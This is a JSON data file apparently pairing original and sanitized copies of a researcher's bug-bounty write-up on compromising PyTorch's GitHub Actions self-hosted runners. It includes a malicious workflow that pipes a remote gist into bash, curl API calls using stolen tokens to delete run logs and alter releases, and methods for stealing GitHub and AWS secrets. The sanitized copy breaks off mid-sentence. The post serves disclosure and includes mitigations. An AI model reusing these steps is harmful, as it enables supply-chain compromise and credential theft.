@@ -1,0 +1,772 @@
+{
+  "original_txt": "Security tends to lag behind adoption, and AI/ML is no exception.\nFour months ago, Adnan Khan and I exploited a critical CI/CD vulnerability in PyTorch, one of the world’s leading ML platforms. Used by titans like Google, Meta, Boeing, and Lockheed Martin, PyTorch is a major target for hackers and nation-states alike.\nThankfully, we exploited this vulnerability before the bad guys.\nHere is how we did it.\nBackground\nBefore we dive in, let’s scope out and discuss why Adnan and I were looking at an ML repository. Let me give you a hint — it was not to gawk at the neural networks. In fact, I don’t know enough about neural networks to be qualified to gawk.\nPyTorch was one of the first steps on a journey Adnan and I started six months ago, based on CI/CD research and exploit development we performed in the summer of 2023. Adnan started the bug bounty foray by leveraging these attacks to exploit a critical vulnerability in GitHub that allowed him to backdoor all of GitHub’s and Azure’s runner images, collecting a $20,000 reward. Following this attack, we teamed up to discover other vulnerable repositories.\nThe results of our research surprised everyone, including ourselves, as we continuously executed supply chain compromises of leading ML platforms, billion-dollar Blockchains, and more. In the seven days since we released our initial blog posts, they’ve caught on in the security world.\nBut, you probably didn’t come here to read about our journey; you came to read about the messy details of our attack on PyTorch. Let’s begin.\nTell Me the Impact\nOur exploit path resulted in the ability to upload malicious PyTorch releases to GitHub, upload releases to AWS, potentially add code to the main repository branch, backdoor PyTorch dependencies – the list goes on. In short, it was bad. Quite bad.\nAs we’ve seen before with SolarWinds, Ledger, and others, supply chain attacks like this are killer from an attacker’s perspective. With this level of access, any respectable nation-state would have several paths to a PyTorch supply chain compromise.\nGitHub Actions Primer\nTo understand our exploit, you need to understand GitHub Actions.\nWant to skip around? Go ahead.\n- Background\n- Tell Me the Impact\n- GitHub Actions Primer\n- Identifying the Vulnerability\n- Executing the Attack\n- Post Exploitation\n- Submission Details – No Bueno\n- Mitigations\n- Is PyTorch an Outlier?\n- References\nIf you’ve never worked with GitHub Actions or similar CI/CD platforms, I recommend reading up before continuing this blog post. Actually, if I lose you at any point, go and Google the technology that confused you. Typically, I like to start from the very basics in my articles, but explaining all the involved CI/CD processes would be a novel in itself.\nIn short, GitHub Actions allow the execution of code specified within workflows as part of the CI/CD process.\nFor example, let’s say PyTorch wants to run a set of tests when a GitHub user submits a pull request. PyTorch can define these tests in a YAML workflow file used by GitHub Actions and configure the workflow to run on the pull_request trigger. Now, whenever a user submits a pull request, the tests will execute on a runner. This way, repository maintainers don’t need to manually test everyone’s code before merging.\nThe public PyTorch repository uses GitHub Actions extensively for CI/CD. Actually, extensively is an understatement. PyTorch has over 70 different GitHub workflows and typically runs over ten workflows every hour. One of the most difficult parts of this operation was scrolling through all of the different workflows to select the ones we were interested in.\nGitHub Actions workflows execute on two types of build runners. One type is GitHub’s hosted runners, which GitHub maintains and hosts in their environment. The other class is self-hosted runners.\nSelf-Hosted Runners\nSelf-hosted runners are build agents hosted by end users running the Actions runner agent on their own infrastructure. In less technical terms, a “self-hosted runner” is a machine, VM, or container configured to run GitHub workflows from a GitHub organization or repository. Securing and protecting the runners is the responsibility of end users, not GitHub, which is why GitHub recommends against using self-hosted runners on public repositories. Apparently, not everyone listens to GitHub, including GitHub.\nIt doesn’t help that some of GitHub’s default settings are less than secure. By default, when a self-hosted runner is attached to a repository, any of that repository’s workflows can use that runner. This setting also applies to workflows from fork pull requests. Remember that anyone can submit a fork pull request to a public GitHub repository. Yes, even you. The result of these settings is that, by default, any repository contributor can execute code on the self-hosted runner by submitting a malicious PR.\nNote: A “contributor” to a GitHub repository is anyone who has added code to the repository. Typically, someone becomes a contributor by submitting a pull request that then gets merged into the default branch. More on this later.\nIf the self-hosted runner is configured using the default steps, it will be a non-ephemeral self-hosted runner. This means that the malicious workflow can start a process in the background that will continue to run after the job completes, and modifications to files (such as programs on the path, etc.) will persist past the current workflow. It also means that future workflows will run on that same runner.\nIdentifying the Vulnerability\nIdentifying Self-Hosted Runners\nTo identify self-hosted runners, we ran Gato, a GitHub attack and exploitation tool developed by Praetorian. Among other things, Gato can enumerate the existence of self-hosted runners within a repository by examining GitHub workflow files and run logs.\nGato identified several persistent, self-hosted runners used by the PyTorch repository. We looked at repository workflow logs to confirm the Gato output.\nThe name “worker-rocm-amd-30” indicates the runner is self-hosted.\nDetermining Workflow Approval Requirements\nEven though PyTorch used self-hosted runners, one major thing could still stop us.\nThe default setting for workflow execution from fork PRs requires approval only for accounts that have not previously contributed to the repository. However, there is an option to allow workflow approval for all fork PRs, including previous contributors. We set out to discover the status of this setting.\nViewing the pull request (PR) history, we found several PRs from previous contributors that triggered pull_request workflows without requiring approval. This indicated that the repository did not require workflow approval for Fork PRs from previous contributors. Bingo.\nNobody had approved this fork PR workflow, yet the “Lint / quick-checks / linux-job” workflow ran on pull_request, indicating the default approval setting was likely in place.\nSearching for Impact\nBefore executing these attacks, we like to identify GitHub secrets that we may be able to steal after landing on the runner. Workflow files revealed several GitHub secrets used by PyTorch, including but not limited to:\n- “aws-pytorch-uploader-secret-access-key”\n- “aws-access-key-id”\n- “GH_PYTORCHBOT_TOKEN” (GitHub Personal Access Token)\n- “UPDATEBOT_TOKEN” (GitHub Personal Access Token)\n- “conda-pytorchbot-token”\nWe were psyched when we saw the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN. A PAT is one of your most valuable weapons if you want to launch a supply chain attack.\nUsing self-hosted runners to compromise GitHub secrets is not always possible. Much of our research has been around self-hosted runner post-exploitation; figuring out methods to go from runner to secrets. PyTorch provided a great opportunity to test these techniques in the wild.\nExecuting the Attack\n1. Fixing a Typo\nWe needed to be a contributor to the PyTorch repository to execute workflows, but we didn’t feel like spending time adding features to PyTorch. Instead, we found a typo in a markdown file and submitted a fix. Another win for the Grammar Police.\nYes, I’m re-using this meme from my last article, but it fits too well.\n2. Preparing the Payload\nNow we had to craft a workflow payload that would allow us to obtain persistence on the self-hosted runner. Red Teamers know that installing persistence in production environments typically isn’t as trivial as a reverse Netcat shell. EDR, firewalls, packet inspection, and more can be in play, particularly in large corporate environments.\nWhen we started these attacks, we asked ourselves the following question – what could we use for Command and Control (C2) that we know for sure would bypass EDR with traffic that would not be blocked by any firewall? The answer is elegant and obvious – we could install another self-hosted GitHub runner and attach it to our private GitHub organization.\nOur “Runner on Runner” (RoR) technique uses the same servers for C2 as the existing runner, and the only binary we drop is the official GitHub runner agent binary, which is already running on the system. See ya, EDR and firewall protections.\nWe created a script to automate the runner registration process and included that as our malicious workflow payload. Storing our payload in a gist, we submitted a malicious draft PR. The modified workflow looked something like this:\nname: “🚨 pre-commit”\nrun-name: “Refactoring and cleanup”\non:\npull_request:\nbranches: main\njobs:\nbuild:\nname: Linux ARM64\nruns-on: ${{ matrix.os }}\nstrategy:\nmatrix:\nos: [\n{system: “ARM64”, name: “Linux ARM64”},\n{system: “benchmark”, name: “Linux Intel”},\n{system: “glue-notify”, name: “Windows Intel”}\n]\nsteps:\n– name: Lint Code Base\ncontinue-on-error: true\nenv:\nVERSION: ${{ matrix.version }}\nSYSTEM_NAME: ${{ matrix.os }}\nrun: curl <GIST_URL> | bash\nThis workflow executes the RoR gist payload on three of PyTorch’s self-hosted runners – a Linux ARM64 machine named “ARM64”, an Intel device named “benchmark,” and a Windows box named “glue-notify.”\nEnabling draft status ensured that repository maintainers wouldn’t receive a notification. However, with the complexity of PyTorch’s CI/CD environment, I’d be surprised if they noticed either way. We submitted the PR and installed our RoR C2 on each self-hosted runner.\nWe used our C2 repository to execute the pwd && ls && /home && ip a command on the runner labeled “jenkins-worker-rocm-amd-34”, confirming stable C2 and remote code execution. We also ran sudo -l to confirm we had root access.\nPost Exploitation\nWe now had root on a self-hosted runner. So what? We had seen previous reports of gaining RCE on self-hosted runners, and they were often met with ambiguous responses due to their ambiguous impact. Given the complexity of these attacks, we wanted to demonstrate a legitimate impact on PyTorch to convince them to take our report seriously. And we had some cool new post-exploitation techniques we’d been wanting to try.\nThe Great Secret Heist\nIn cloud and CI/CD environments, secrets are king. When we began our post-exploitation research, we focused on the secrets an attacker could steal and leverage in a typical self-hosted runner setup. Most of the secret stealing starts with the GITHUB_TOKEN.\nThe Magical GITHUB_TOKEN\nTypically, a workflow needs to checkout a GitHub repository to the runner’s filesystem, whether to run tests defined in the repository, commit changes, or even publish releases. The workflow can use a GITHUB_TOKEN to authenticate to GitHub and perform these operations. GITHUB_TOKEN permissions can vary from read-only access to extensive write privileges over the repository. If a workflow executes on a self-hosted runner and uses a GITHUB_TOKEN, that token will be on the runner for the duration of that build.\nPyTorch had several workflows that used the actions/checkout step with a GITHUB_TOKEN that had write permissions. For example, by searching through workflow logs, we can see the periodic.yml workflow also ran on the jenkins-worker-rocm-amd-34 self-hosted runner. The logs confirmed that this workflow used a GITHUB_TOKEN with extensive write permissions.\nThis token would only be valid for the life of that particular build. However, we developed some special techniques to extend the build length once you are on the runner (more on this in a future post). Due to the insane number of workflows that run daily from the PyTorch repository, we were not worried about tokens expiring, as we could always compromise another one.\nWhen a workflow uses the actions/checkout step, the GITHUB_TOKEN is stored in the .git/config file of the checked-out repository on the self-hosted runner during an active workflow. Since we controlled the runner, all we had to do was wait until a non-PR workflow ran on the runner with a privileged GITHUB_TOKEN and then print out the contents of the config file.\nWe used our RoR C2 to steal the GITHUB_TOKEN of an ongoing workflow with write permissions.\nCovering our Tracks\nOur first use of the GITHUB_TOKEN was to eliminate the run logs from our malicious pull request. We wanted a full day to perform post-exploitation and didn’t want to cause any alarms from our activity. We used the GitHub API along with the token to delete the run logs for each of the workflows our PR triggered. Stealth mode = activated.\ncurl -L \\\n-X DELETE \\\n-H “Accept: application/vnd.github+json” \\\n-H “Authorization: Bearer $STOLEN_TOKEN” \\\n-H “X-GitHub-Api-Version: 2022-11-28” \\\n<a href=\"https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/<run_id>\nIf you want a challenge, you can try to discover the workflows associated with our initial malicious PR and observe that the logs no longer exist. In reality, they likely wouldn’t have caught our workflows anyway. PyTorch has so many workflow runs that it reaches the limit for a single repository after a few days.\nModifying Repository Releases\nUsing the token, we could upload an asset claiming to be a pre-compiled, ready-to-use PyTorch binary and add a release note with instructions to run and download the binary. Any users that downloaded the binary would then be running our code. If the current source code assets were not pinned to the release commit, the attacker could overwrite those assets directly. As a POC, we used the following cURL request to modify the name of a PyTorch GitHub release. We just as easily could have uploaded our own assets.\ncurl -L \\\n-X PATCH \\\n-H “Accept: application/vnd.github+json” \\\n-H “Authorization: Bearer $GH_TOKEN” \\\n-H “X-GitHub-Api-Version: 2022-11-28” \\\nhttps://api.github.com/repos/pytorch/pytorch/releases/102257798 \\\n-d ‘{“tag_name”:”v2.0.1″,”name”:”PyTorch 2.0.1 Release, bug fix release (- John Stawinski)”}’\nAs a POC, we added my name to the latest PyTorch release at the time. A malicious attacker could execute a similar API request to replace the latest release artifact with their malicious artifact.\nRepository Secrets\nIf backdooring PyTorch repository releases sounds fun, well, that is only a fraction of the impact we achieved when we looked at repository secrets.\nThe PyTorch repository used GitHub secrets to allow the runners to access sensitive systems during the automated release process. The repository used a lot of secrets, including several sets of AWS keys and GitHub Personal Access Tokens (PATs) discussed earlier.\nSpecifically, the weekly.yml workflow used the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN secrets to authenticate to GitHub. GitHub Personal Access Tokens (PATs) are often overprivileged, making them a great target for attackers. This workflow did not run on a self-hosted runner, so we couldn’t wait for a run and then steal the secrets from the filesystem (a technique we use frequently).\nThe weekly.yml workflow used two PATs as secrets. This workflow called the _update-commit-hash workflow, which specified use of a GitHub-hosted runner.\nEven though this workflow wouldn’t run on our runner, the GITHUB_TOKENs we could compromise had actions:write privileges. We could use the token to trigger workflows with the workflow_dispatch event. Could we use that to run our malicious code in the context of the weekly.yml workflow?\nWe had some ideas but weren’t sure whether they’d work in practice. So, we decided to find out.\nIt turns out that you can’t use a GITHUB_TOKEN to modify workflow files. However, we discovered several creative…”workarounds”…that will let you add malicious code to a workflow using a GITHUB_TOKEN. In this scenario, weekly.yml used another workflow, which used a script outside the .github/workflows directory. We could add our code to this script in our branch. Then, we could trigger that workflow on our branch, which would execute our malicious code.\nIf this sounds confusing, don’t worry; it also confuses most bug bounty programs. Hopefully, we’ll get to provide an in-depth look at this and our other post-exploitation techniques at a certain security conference in LV, NV. If we don’t get that opportunity, we’ll cover our other methods in a future blog post.\nBack to the action. To execute this phase of the attack, we compromised another GITHUB_TOKEN and used it to clone the PyTorch repository. We created our own branch, added our payload, and triggered the workflow.\nAs a stealth bonus, we changed our git username in the commit to pytorchmergebot, so that our commits and workflows appeared to be triggered by the pytorchmergebot user, who interacted frequently with the PyTorch repository.\nOur payload ran in the context of the weekly.yml workflow, which used the GitHub secrets we were after. The payload encrypted the two GitHub PATs and printed them to the workflow log output. We protected the private encryption key so that only we could perform decryption.\nWe triggered the weekly.yml workflow on our citesting1112 branch using the following cURL command.\ncurl -L \\\n-X POST \\\n-H “Accept: application/vnd.github+json” \\\n-H “Authorization: Bearer $STOLEN_TOKEN” \\\n-H “X-GitHub-Api-Version: 2022-11-28” \\\nhttps://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches \\\n-d ‘{“ref”:”citesting1112″}’\nNavigating to the PyTorch “Actions” tab, we saw our encrypted output containing the PATs in the results of the “Weekly” workflow.\nFinally, we canceled the workflow run and deleted the logs.\nPAT Access\nAfter decrypting the GitHub PATs, we enumerated their access with Gato.\nWe decrypted the PATs with our private key.\nGato revealed the PATs had access to over 93 repositories within the PyTorch organization, including many private repos and administrative access over several. These PATs provided multiple paths to supply chain compromise.\nFor example, if an attacker didn’t want to bother with tampering releases, they could likely add code directly to the main branch of PyTorch. The main branch was protected, but the PAT belonging to pytorchbot could create a new branch and add its own code, and then the PAT belonging to pytorchupdatebot could approve the PR. We could then use pytorchmergebot to trigger the merge.\nWe didn’t use that attack path to add code to the main branch, but existing PyTorch PRs indicated it was possible. Even if an attacker couldn’t push directly to the main branch, there are other paths to supply chain compromise.\nIf the threat actor wanted to be more stealthy, they could add their malicious code to one of the other private or public repositories used by PyTorch within the PyTorch organization. These repositories had less visibility and were less likely to be closely reviewed. Or, they could smuggle their code into a feature branch, or steal more secrets, or do any number of creative techniques to compromise the PyTorch supply chain.\nAWS Access\nTo prove that the PAT compromise was not a one-off, we decided to steal more secrets – this time, AWS keys.\nWe won’t bore you with all the details, but we executed a similar attack to the one above to steal the aws-pytorch-uploader-secret-access-key and aws-access-key-id belonging to the pytorchbot AWS user. These AWS keys had privileges to upload PyTorch releases to AWS, providing another path to backdoor PyTorch releases. The impact of this attack would depend on the sources that pulled releases from AWS and the other assets in this AWS account.\nWe used the AWS CLI to confirm the AWS credentials belonged to the pytorchbot AWS user.\nWe listed the contents of the “pytorch” bucket, revealing many sensitive artifacts, including PyTorch releases.\nWe discovered production PyTorch artifacts and confirmed write access to S3. We later confirmed that the PyTorch website pulls directly from these releases, so backdooring releases in these S3 buckets would allow an attacker to compromise any user that downloaded PyTorch from the PyTorch website, whether manually or with a `pip install`.\nThere were other sets of AWS keys, GitHub PATs, and various credentials we could have stolen, but we believed we had a clear demonstration of impact at this point. Given the critical nature of the vulnerability, we wanted to submit the report as soon as possible before one of PyTorch’s 3,500 contributors decided to make a deal with a foreign adversary.\nA full attack path diagram.\nSubmission Details – No Bueno\nOverall, the PyTorch submission process was blah, to use a technical term. They frequently had long response times, and their fixes were questionable.\nWe also learned this wasn’t the first time they had issues with self-hosted runners – earlier in 2023, Marcus Young executed a pipeline attack to gain RCE on a single PyTorch runner. Marcus did not perform the post-exploitation techniques we used to demonstrate impact, but PyTorch still should have locked down their runners after his submission. Marcus’ report earned him a $10,000 bounty.\nWe haven’t investigated PyTorch’s new setup enough to provide our opinion on their solution to securing their runners. Rather than require approval for contributor’s fork PRs, PyTorch opted to implement a layer of controls to prevent abuse.\nTimeline\nAugust 9th, 2023 – Report submitted to Meta bug bounty\nAugust 10th, 2023 – Report “sent to appropriate product team”\nSeptember 8th, 2023 – We reached out to Meta to ask for an update\nSeptember 12th, 2023 – Meta said there is no update to provide\nOctober 16th, 2023 – Meta said “we consider the issue mitigated, if you think this wasn’t fully mitigated, please let us know.”\nOctober 16th, 2023 – We responded by saying we believed the issue had not been fully mitigated.\nNovember 1st, 2023 – We reached out to Meta, asking for another update.\nNovember 21st, 2023 – Meta responded, saying they reached out to a team member to provide an update.\nDecember 7th, 2023 – After not receiving an update, we sent a strongly worded message to Meta, expressing our concerns about the disclosure process and the delay in remediation.\nDecember 7th, 2023 – Meta responded, saying they believed the issue was mitigated and the delay was regarding the bounty.\nDecember 7th, 2023 – Several back-and-forths ensued discussing remediation.\nDecember 15th, 2023 – Meta awarded a $5000 bounty, plus 10% due to the delay in payout.\nDecember 15th, 2023 – Meta provided more detail as to the remediation steps they performed after the initial vulnerability disclosure and offered to set up a call if we had more questions.\nDecember 16th, 2023 – We responded, opting not to set up a call, and asked a question about bounty payout (at this point, we were pretty done with looking at PyTorch).\nMitigations\nThe easiest way to mitigate this class of vulnerability is to change the default setting of ‘Require approval for first-time contributors’ to ‘Require approval for all outside collaborators’. It is a no-brainer for any public repository that uses self-hosted runners to ensure they use the restrictive setting, although PyTorch seems to disagree.\nIf workflows from fork-PRs are necessary, organizations should only use GitHub-hosted runners. If self-hosted runners are also necessary, use isolated, ephemeral runners and ensure you know the risks involved.\nIt is challenging to design a solution allowing anyone to run arbitrary code on your infrastructure without risks, especially in an organization like PyTorch that thrives off community contributions.\nIs PyTorch an Outlier?\nThe issues surrounding these attack paths are not unique to PyTorch. They’re not unique to ML repositories or even to GitHub. We’ve repeatedly demonstrated supply chain weaknesses by exploiting CI/CD vulnerabilities in the world’s most advanced technological organizations across several CI/CD platforms, and those are only a small subset of the greater attack surface.\nThreat actors are starting to catch on, as shown by the year-over-year increase in supply chain attacks. Security researchers won’t always be able to find these vulnerabilities before malicious attackers.\nBut in this case, the researchers got there first.\nWant to hear more? Subscribe to the official John IV newsletter to receive live, monthly updates of my interests and passions.\nReferences\n- https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/\n- https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/\n- https://marcyoung.us/post/zuckerpunch/\n- https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/\n- https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/\n- https://github.com/nikitastupin/pwnhub\n- https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions\n- https://owasp.org/www-project-top-10-ci-cd-security-risks/\nLeave a comment",
+  "sanitized_txt": "Security tends to lag behind adoption, and AI/ML is no exception.\nFour months ago, Adnan Khan and I exploited a critical CI/CD vulnerability in PyTorch, one of the world’s leading ML platforms. Used by titans like Google, Meta, Boeing, and Lockheed Martin, PyTorch is a major target for hackers and nation-states alike.\nThankfully, we exploited this vulnerability before the bad guys.\nHere is how we did it.\nBackground Before we dive in, let’s scope out and discuss why Adnan and I were looking at an ML repository. Let me give you a hint — it was not to gawk at the neural networks. In fact, I don’t know enough about neural networks to be qualified to gawk.\nPyTorch was one of the first steps on a journey Adnan and I started six months ago, based on CI/CD research and exploit development we performed in the summer of 2023. Adnan started the bug bounty foray by leveraging these attacks to exploit a critical vulnerability in GitHub that allowed him to backdoor all of GitHub’s and Azure’s runner images, collecting a $20,000 reward. Following this attack, we teamed up to discover other vulnerable repositories.\nThe results of our research surprised everyone, including ourselves, as we continuously executed supply chain compromises of leading ML platforms, billion-dollar Blockchains, and more. In the seven days since we released our initial blog posts, they’ve caught on in the security world.\nBut, you probably didn’t come here to read about our journey; you came to read about the messy details of our attack on PyTorch. Let’s begin.\nTell Me the Impact Our exploit path resulted in the ability to upload malicious PyTorch releases to GitHub, upload releases to AWS, potentially add code to the main repository branch, backdoor PyTorch dependencies – the list goes on. In short, it was bad. Quite bad.\nAs we’ve seen before with SolarWinds, Ledger, and others, supply chain attacks like this are killer from an attacker’s perspective. With this level of access, any respectable nation-state would have several paths to a PyTorch supply chain compromise.\nGitHub Actions Primer To understand our exploit, you need to understand GitHub Actions.\nWant to skip around? Go ahead.\n- Background - Tell Me the Impact - GitHub Actions Primer - Identifying the Vulnerability - Executing the Attack - Post Exploitation - Submission Details – No Bueno - Mitigations - Is PyTorch an Outlier?\n- References If you’ve never worked with GitHub Actions or similar CI/CD platforms, I recommend reading up before continuing this blog post. Actually, if I lose you at any point, go and Google the technology that confused you. Typically, I like to start from the very basics in my articles, but explaining all the involved CI/CD processes would be a novel in itself.\nIn short, GitHub Actions allow the execution of code specified within workflows as part of the CI/CD process.\nFor example, let’s say PyTorch wants to run a set of tests when a GitHub user submits a pull request. PyTorch can define these tests in a YAML workflow file used by GitHub Actions and configure the workflow to run on the pull_request trigger. Now, whenever a user submits a pull request, the tests will execute on a runner. This way, repository maintainers don’t need to manually test everyone’s code before merging.\nThe public PyTorch repository uses GitHub Actions extensively for CI/CD. Actually, extensively is an understatement. PyTorch has over 70 different GitHub workflows and typically runs over ten workflows every hour. One of the most difficult parts of this operation was scrolling through all of the different workflows to select the ones we were interested in.\nGitHub Actions workflows execute on two types of build runners. One type is GitHub’s hosted runners, which GitHub maintains and hosts in their environment. The other class is self-hosted runners.\nSelf-Hosted Runners Self-hosted runners are build agents hosted by end users running the Actions runner agent on their own infrastructure. In less technical terms, a “self-hosted runner” is a machine, VM, or container configured to run GitHub workflows from a GitHub organization or repository. Securing and protecting the runners is the responsibility of end users, not GitHub, which is why GitHub recommends against using self-hosted runners on public repositories. Apparently, not everyone listens to GitHub, including GitHub.\nIt doesn’t help that some of GitHub’s default settings are less than secure. By default, when a self-hosted runner is attached to a repository, any of that repository’s workflows can use that runner. This setting also applies to workflows from fork pull requests. Remember that anyone can submit a fork pull request to a public GitHub repository. Yes, even you. The result of these settings is that, by default, any repository contributor can execute code on the self-hosted runner by submitting a malicious PR.\nNote: A “contributor” to a GitHub repository is anyone who has added code to the repository. Typically, someone becomes a contributor by submitting a pull request that then gets merged into the default branch. More on this later.\nIf the self-hosted runner is configured using the default steps, it will be a non-ephemeral self-hosted runner. This means that the malicious workflow can start a process in the background that will continue to run after the job completes, and modifications to files (such as programs on the path, etc.) will persist past the current workflow. It also means that future workflows will run on that same runner.\nIdentifying the Vulnerability Identifying Self-Hosted Runners To identify self-hosted runners, we ran Gato, a GitHub attack and exploitation tool developed by Praetorian. Among other things, Gato can enumerate the existence of self-hosted runners within a repository by examining GitHub workflow files and run logs.\nGato identified several persistent, self-hosted runners used by the PyTorch repository. We looked at repository workflow logs to confirm the Gato output.\nThe name “worker-rocm-amd-30” indicates the runner is self-hosted.\nDetermining Workflow Approval Requirements Even though PyTorch used self-hosted runners, one major thing could still stop us.\nThe default setting for workflow execution from fork PRs requires approval only for accounts that have not previously contributed to the repository. However, there is an option to allow workflow approval for all fork PRs, including previous contributors. We set out to discover the status of this setting.\nViewing the pull request (PR) history, we found several PRs from previous contributors that triggered pull_request workflows without requiring approval. This indicated that the repository did not require workflow approval for Fork PRs from previous contributors. Bingo.\nNobody had approved this fork PR workflow, yet the “Lint / quick-checks / linux-job” workflow ran on pull_request, indicating the default approval setting was likely in place.\nSearching for Impact Before executing these attacks, we like to identify GitHub secrets that we may be able to steal after landing on the runner. Workflow files revealed several GitHub secrets used by PyTorch, including but not limited to:\n- “aws-pytorch-uploader-secret-access-key” - “aws-access-key-id” - “GH_PYTORCHBOT_TOKEN” (GitHub Personal Access Token) - “UPDATEBOT_TOKEN” (GitHub Personal Access Token) - “conda-pytorchbot-token” We were psyched when we saw the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN. A PAT is one of your most valuable weapons if you want to launch a supply chain attack.\nUsing self-hosted runners to compromise GitHub secrets is not always possible. Much of our research has been around self-hosted runner post-exploitation; figuring out methods to go from runner to secrets. PyTorch provided a great opportunity to test these techniques in the wild.\nExecuting the Attack 1. Fixing a Typo We needed to be a contributor to the PyTorch repository to execute workflows, but we didn’t feel like spending time adding features to PyTorch. Instead, we found a typo in a markdown file and submitted a fix. Another win for the Grammar Police.\nYes, I’m re-using this meme from my last article, but it fits too well.\n2. Preparing the Payload Now we had to craft a workflow payload that would allow us to obtain persistence on the self-hosted runner. Red Teamers know that installing persistence in production environments typically isn’t as trivial as a reverse Netcat shell. EDR, firewalls, packet inspection, and more can be in play, particularly in large corporate environments.\nWhen we started these attacks, we asked ourselves the following question – what could we use for Command and Control (C2) that we know for sure would bypass EDR with traffic that would not be blocked by any firewall? The answer is elegant and obvious – we could install another self-hosted GitHub runner and attach it to our private GitHub organization.\nOur “Runner on Runner” (RoR) technique uses the same servers for C2 as the existing runner, and the only binary we drop is the official GitHub runner agent binary, which is already running on the system. See ya, EDR and firewall protections.\nWe created a script to automate the runner registration process and included that as our malicious workflow payload. Storing our payload in a gist, we submitted a malicious draft PR. The modified workflow looked something like this:\nname: “🚨 pre-commit” run-name: “Refactoring and cleanup” on:\npull_request:\nbranches: main jobs:\nbuild:\nname: Linux ARM64 runs-on: ${{ matrix.os }} strategy:\nmatrix:\nos: [ {system: “ARM64”, name: “Linux ARM64”}, {system: “benchmark”, name: “Linux Intel”}, {system: “glue-notify”, name: “Windows Intel”} ] steps:\n– name: Lint Code Base continue-on-error: true env:\nVERSION: ${{ matrix.version }} SYSTEM_NAME: ${{ matrix.os }} run: curl <GIST_URL> | bash This workflow executes the RoR gist payload on three of PyTorch’s self-hosted runners – a Linux ARM64 machine named “ARM64”, an Intel device named “benchmark,” and a Windows box named “glue-notify.” Enabling draft status ensured that repository maintainers wouldn’t receive a notification. However, with the complexity of PyTorch’s CI/CD environment, I’d be surprised if they noticed either way. We submitted the PR and installed our RoR C2 on each self-hosted runner.\nWe used our C2 repository to execute the pwd && ls && /home && ip a command on the runner labeled “jenkins-worker-rocm-amd-34”, confirming stable C2 and remote code execution. We also ran sudo -l to confirm we had root access.\nPost Exploitation We now had root on a self-hosted runner. So what? We had seen previous reports of gaining RCE on self-hosted runners, and they were often met with ambiguous responses due to their ambiguous impact. Given the complexity of these attacks, we wanted to demonstrate a legitimate impact on PyTorch to convince them to take our report seriously. And we had some cool new post-exploitation techniques we’d been wanting to try.\nThe Great Secret Heist In cloud and CI/CD environments, secrets are king. When we began our post-exploitation research, we focused on the secrets an attacker could steal and leverage in a typical self-hosted runner setup. Most of the secret stealing starts with the GITHUB_TOKEN.\nThe Magical GITHUB_TOKEN Typically, a workflow needs to checkout a GitHub repository to the runner’s filesystem, whether to run tests defined in the repository, commit changes, or even publish releases. The workflow can use a GITHUB_TOKEN to authenticate to GitHub and perform these operations. GITHUB_TOKEN permissions can vary from read-only access to extensive write privileges over the repository. If a workflow executes on a self-hosted runner and uses a GITHUB_TOKEN, that token will be on the runner for the duration of that build.\nPyTorch had several workflows that used the actions/checkout step with a GITHUB_TOKEN that had write permissions. For example, by searching through workflow logs, we can see the periodic.yml workflow also ran on the jenkins-worker-rocm-amd-34 self-hosted runner. The logs confirmed that this workflow used a GITHUB_TOKEN with extensive write permissions.\nThis token would only be valid for the life of that particular build. However, we developed some special techniques to extend the build length once you are on the runner (more on this in a future post). Due to the insane number of workflows that run daily from the PyTorch repository, we were not worried about tokens expiring, as we could always compromise another one.\nWhen a workflow uses the actions/checkout step, the GITHUB_TOKEN is stored in the .git/config file of the checked-out repository on the self-hosted runner during an active workflow. Since we controlled the runner, all we had to do was wait until a non-PR workflow ran on the runner with a privileged GITHUB_TOKEN and then print out the contents of the config file.\nWe used our RoR C2 to steal the GITHUB_TOKEN of an ongoing workflow with write permissions.\nCovering our Tracks Our first use of the GITHUB_TOKEN was to eliminate the run logs from our malicious pull request. We wanted a full day to perform post-exploitation and didn’t want to cause any alarms from our activity. We used the GitHub API along with the token to delete the run logs for each of the workflows our PR triggered. Stealth mode = activated.\ncurl -L \\ -X DELETE \\ -H “Accept: application/vnd.github+json” \\ -H “Authorization: Bearer $STOLEN_TOKEN” \\ -H “X-GitHub-Api-Version: 2022-11-28” \\ <a href=\"https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/<run_id> If you want a challenge, you can try to discover the workflows associated with our initial malicious PR and observe that the logs no longer exist. In reality, they likely wouldn’t have caught our workflows anyway. PyTorch has so many workflow runs that it reaches the limit for a single repository after a few days.\nModifying Repository Releases Using the token, we could upload an asset claiming to be a pre-compiled, ready-to-use PyTorch binary and add a release note with instructions to run and download the binary. Any users that downloaded the binary would then be running our code. If the current source code assets were not pinned to the release commit, the attacker could overwrite those assets directly. As a POC, we used the following cURL request to modify the name of a PyTorch GitHub release. We just as easily could have uploaded our own assets.\ncurl -L \\ -X PATCH \\ -H “Accept: application/vnd.github+json” \\ -H “Authorization: Bearer $GH_TOKEN” \\ -H “X-GitHub-Api-Version: 2022-11-28” \\ https://api.github.com/repos/pytorch/pytorch/releases/102257798 \\ -d ‘{“tag_name”:”v2.0.1″,”name”:”PyTorch 2.0.1 Release, bug fix release (- John Stawinski)”}’ As a POC, we added my name to the latest PyTorch release at the time. A malicious attacker could execute a similar API request to replace the latest release artifact with their malicious artifact.\nRepository Secrets If backdooring PyTorch repository releases sounds fun, well, that is only a fraction of the impact we achieved when we looked at repository secrets.\nThe PyTorch repository used GitHub secrets to allow the runners to access sensitive systems during the automated release process. The repository used a lot of secrets, including several sets of AWS keys and GitHub Personal Access Tokens (PATs) discussed earlier.\nSpecifically, the weekly.yml workflow used the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN secrets to authenticate to GitHub. GitHub Personal Access Tokens (PATs) are often overprivileged, making them a great target for attackers. This workflow did not run on a self-hosted runner, so we couldn’t wait for a run and then steal the secrets from the filesystem (a technique we use frequently).\nThe weekly.yml workflow used two PATs as secrets. This workflow called the _update-commit-hash workflow, which specified use of a GitHub-hosted 